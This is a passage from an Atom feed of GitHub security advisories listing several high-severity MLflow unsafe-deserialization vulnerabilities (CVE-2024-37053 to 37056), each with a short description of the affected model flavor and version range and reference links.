<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37056">https://nvd.nist.gov/vuln/detail/CVE-2024-37056</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-7p8j-qv6x-f4g4">https://github.com/advisories/GHSA-7p8j-qv6x-f4g4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7p8j-qv6x-f4g4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-x38x-g6gr-jqff</id>
        <link href="https://github.com/advisories/GHSA-x38x-g6gr-jqff"/>
        <updated>2024-06-05T13:18:08.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.24.0 or newer, enabling a maliciously uploaded pmdarima model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37055">https://nvd.nist.gov/vuln/detail/CVE-2024-37055</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-x38x-g6gr-jqff">https://github.com/advisories/GHSA-x38x-g6gr-jqff</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x38x-g6gr-jqff</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-ghv6-9r9j-wh4j</id>
        <link href="https://github.com/advisories/GHSA-ghv6-9r9j-wh4j"/>
        <updated>2024-06-05T13:17:58.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 0.9.0 or newer, enabling a maliciously uploaded PyFunc model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37054">https://nvd.nist.gov/vuln/detail/CVE-2024-37054</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-ghv6-9r9j-wh4j">https://github.com/advisories/GHSA-ghv6-9r9j-wh4j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ghv6-9r9j-wh4j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] MLFlow unsafe deserialization]]></title>
        <id>https://github.com/advisories/GHSA-43c4-9qgj-x742</id>
        <link href="https://github.com/advisories/GHSA-43c4-9qgj-x742"/>
        <updated>2024-06-05T13:17:50.000Z</updated>
        <content type="html"><![CDATA[<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.1.0 or newer, enabling a maliciously uploaded scikit-learn model to run arbitrary code on an end user’s system when interacted with.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37053">https://nvd.nist.gov/vuln/detail/CVE-2024-37053</a></li>
<li><a href="https://hiddenlayer.com/sai-security-advisory/mlflow-june2024">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>
<li><a href="https://github.com/advisories/GHSA-43c4-9qgj-x742">https://github.com/advisories/GHSA-43c4-9qgj-x742</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-43c4-9qgj-x742</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-04T12:31:04.000Z</published>
    </entry>
</feed>